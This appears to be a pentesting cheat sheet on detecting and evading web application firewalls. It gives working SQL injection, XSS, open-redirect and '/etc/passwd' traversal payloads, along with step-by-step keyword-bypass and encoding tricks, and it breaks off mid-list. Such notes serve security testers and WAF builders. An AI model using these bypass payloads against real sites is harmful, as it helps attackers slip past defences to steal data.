# Introduction
## Definition
A Web Application Firewall (WAF) is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system.
## Working Mechanism
- Uses a set of rule to distinguish between normal requests and malicious requests.
- Sometimes they use a learning methods to add rules automatically learning user behavior.
## Operation modes
- **Negative  Model** (Blacklisting) - A blacklisting model uses pre-set signatures to block web traffic that is clearly malicious, and signatures designed to prevent attacks which exploit certain website and web application vulnerabilities.  Highly effective against an major types of DDoS attacks.
- **Positive Model** (Whitelisting) - A whitelisting model only allows web traffic according to specifically configured criteria. For example, it can be configured to only allow HTTP GET requests from certain IP addresses. Whitelisting model firewalls are probably best for web applications on an internal network that are designed to be used by only a limited group of people, such as employees.
- **Mixed/Hybrid Model** (Inclusive model) - A hybrid security model is one that blends both whitelisting and blacklisting. Depending on all sorts of configuration specifics, hybrid firewalls could be the best choice for both web applications on internal networks and web applications on the public internet.

# Detection Techniques 
**For Identifying WAFs, we need to (dummy) provoke it.**
- Making a normal **GET** request from a browser, intercept and record response headers (specifically cookies).
- Making a request from command line (eg. cURL), and test response content and headers (no user-agent included).
- Making **GET** requests to random open ports and grab banners which might expose the WAFs identity.
- If there is a login page somewhere, try some common (easily detectable) payloads like `" or 1 = 1 --`.
- If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
- Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
- Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
- Make **GET** requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support **POST** type queries).
- Many times, the WAF varies the `Server` header upon different types of interactions.
# Evasion Techniques
## Fuzzing
- **Methods** 
	- Running a set of payloads against the URL/endpoint.
- **Technique** 
	- Load up your wordlists into the fuzzer and start brute forcing. (eg, FFUF, WFUZZ etc)
	- Record all the responses from the different payloads fuzzed.
	- Use random user-agents, ranging from Chrome Desktop to iPhone browser.
	- If we get blocked, we can increase fuzz latency (eg. 2-4 secs).
	- Using of proxychains is good, there are chances of our IP getting blocked.
- Drawbacks
	- This method does not have high success rate.
	- Many times your IP is blocked (temporarily/permanently).

## Regex Reversing 
- **Methods**
	- Most efficient methods of bypassing WAF. 
	- Some WAFs rely upon matching the attack payloads with the signatures in their databases.
	- Payload matches the reg-ex the WAF triggers alarm.
- **Techniques**
	- **Blacklisting Detection and Bypass**
		- We will try to fingerprint the rules step by step and find which keywords are blacklisted.
		- The idea is to guess the regex and make payloads which does not use blacklisted words.
	- For example, In **SQL injection**
		- **Keywords blacklisted**: `and`, `or`, `union`
			- Blocked Attempt : `union select user, password from users`
			- Bypassed Injection : `1 || (select users from users where user_id =1) = 'admin'`.
			
		- **Keywords Blacklisted**: `and`, `or`, `union`, `where`
			- Blocked Attempt: `1 || (select user from users where user_id = 1) = 'admin'`
			- Bypassed Injection: `1 || (select user from users limit 1) = 'admin'`
			
		- **Keywords Blacklisted** : `and`, `or`, `union`, `where`, `limit`
			- Blocked Attempt : `1 || (select user from users limit 1) = 'admin'`
			- Bypassed Injection :  `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
			
		- **Keywords Blacklisted** : `and`, `or`, `union`, `where`, `limit`, `group by`
			- Blocked Attempt : `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
			- Bypassed Injection : `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
			
		- **Keywords Blacklisted** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`
			- Blocked Attempt :  `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
			- Bypassed Attempt: `1 || substr(user,1,1) = 'a'`
		
		- **Keywords Blacklisted** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`
			- Blocked Attempt: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
			- Bypassed Attempt : `1 || substr(user,1,1) = 0x61`
			- Bypassed Attempt : `1 || substr(user,1,1) = unhex(61)`
		
		- **Keywords Blacklisted** : `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`
			- Blocked Attempt : `1 || substr(user,1,1) = unhex(61)`
			- Bypassed Attempt : `1 || substr(user,1,1) = lower(conv(11,10,36))`

## Obfuscation
- **Methods** 
	- Encoding payloads to different encoding as required.
	- We can either encode whole payload or some parts of the payload.
- **Technique**
	- **Case Toggling**
		- Some poorly developed WAFs filter selectively specific case WAFs.
		- We can combine upper and lower case characters for developing efficient payloads.
			- **Standard** : ``<script>alert()</script>`
			- **Bypassed**: `<ScRipT>alert()</sCRipT>`
			
			- **Standard** : `SELECT * FROM all_tables WHERE OWNER = <DATABASE_NAME>`
			- **Bypassed**: `sELecT * FrOm all_tables whERe OWNER = <DATABASE_NAME>`
	- **URL Encoding** :
		- Encode normal payload with URL Encoding.
		- It can be encoded from [this](https://www.url-encode-decode.com) site.
		- BurpSuite also has its own built-in encoder/decoder.
			- **Blocked** : `<svG/x=">"/oNloaD=confirm()//`
			- **Bypassed** : `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`
			
			- **Blocked**: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`
			- **Bypassed** : `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`
	- **Unicode Normalization**
		- **ASCII** characters in Unicode encoding provide great variants for bypassing WAFs.
		- We can encode entire/part of the payload for obtaining results.
			- **Standard**: `<marquee onstart=prompt()>`  
			- **Obfuscated**: `<marquee onstart=\u0070r\u06f\u006dpt()>`

			- **Blocked**: `/?redir=http://google.com`  
			- **Bypassed**: `/?redir=http://google。com` (Unicode alternative)

			- **Blocked**: `<marquee loop=1 onfinish=alert()>x`  
			- **Bypassed**: `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode alternative)
			
			- **Standard**: `../../etc/passwd`  
			- **Obfuscated**: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
	- 